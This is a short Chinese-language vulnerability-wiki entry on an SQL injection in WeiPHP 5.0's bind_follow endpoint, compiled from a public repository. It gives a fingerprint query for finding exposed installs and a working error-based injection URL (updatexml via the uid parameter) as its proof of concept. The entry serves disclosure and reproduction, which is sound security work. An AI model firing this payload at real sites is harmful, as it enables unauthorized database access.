---
title: "WeiPHP5.0 bind_follow SQL注入漏洞"
date: 2026-10-12 09:01:04
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "WeiPHP"
tags:
  - "WeiPHP"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

Weiphp5.0 所有使用了 wp_where() 函数并且参数可控的SQL查询均受到影响，前台后台均存在注入。

## 漏洞影响

```
Weiphp5.0
```

## 网络测绘

```
app="WeiPHP"
```

## 漏洞复现

登陆页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162318466.png)

验证POC

```php
/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/WeiPHP5.0-bind_follow-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
